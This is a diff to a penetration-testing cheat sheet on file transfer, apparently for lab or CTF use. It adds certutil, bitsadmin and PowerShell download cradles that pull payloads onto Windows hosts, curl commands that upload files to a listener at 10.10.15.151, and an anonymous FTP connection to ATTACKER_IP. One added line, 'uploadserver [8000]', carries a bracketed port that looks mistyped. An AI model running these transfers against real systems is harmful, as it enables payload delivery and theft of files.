@@ -72,7 +72,9 @@ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/
 
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
+
 bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
+
 
 #PS
 (New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
@@ -126,11 +128,13 @@ Harmj0y has compiled an extensive list of PowerShell download cradles [here](htt
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
-python3 -m uploadserver
+python3 -m uploadserver [8000]
 # With basic auth: 
 # python3 -m uploadserver --basic-auth hello:world
 
 # Send a file
+curl -X POST http://10.10.15.151:9999/upload -F "files=@a.txt" # linux
+
 curl -X POST http://HOST:8000/upload -F "files=@file.txt" # curl.exe on windows
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
@@ -212,6 +216,11 @@ if __name__ == "__main__":
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21 # Anonymous authentication is enabled by default
 python3 -m pyftpdlib --port 21 --write # allow upload file to the server
+
+# connect from linux
+ftp ATTACKER_IP 21
+# Name: anonymous
+#Password: (press Enter)
 ```
 
 ### FTP server (NodeJS)
